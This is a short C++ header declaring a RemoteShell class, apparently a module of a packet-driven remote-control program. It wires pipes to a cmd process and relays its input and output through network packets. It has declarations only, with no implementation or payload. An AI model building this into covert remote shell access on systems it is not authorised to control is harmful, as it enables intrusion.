#pragma once

//#include "Local.h"

#include "functionBase.h"

#include <clocale>




class RemoteShell : public FunctionBase
{


public:
	RemoteShell(void);
	~RemoteShell(void);

	void Start();
	void Stop() const;

	static DWORD WINAPI ReadPipeThread(LPVOID param);

	void Write(char * data) const;
	int FunctionIdentity() override;
	void ProcessPacket(PACKET * packet) override;


private:
	char m_cmdPath[MAX_PATH];
	HANDLE m_hThreadProc;
    static HANDLE m_stdinRd;
	static HANDLE m_stdinWr;

	static HANDLE m_stdoutRd;
	static HANDLE m_stdoutWr;


	STARTUPINFO m_si;
	PROCESS_INFORMATION m_pi;
    

	bool IsCmdProcessIsRunning() const;
	static bool CreateIOPipes();
	bool CreateSuspendedCMDProcess();

};

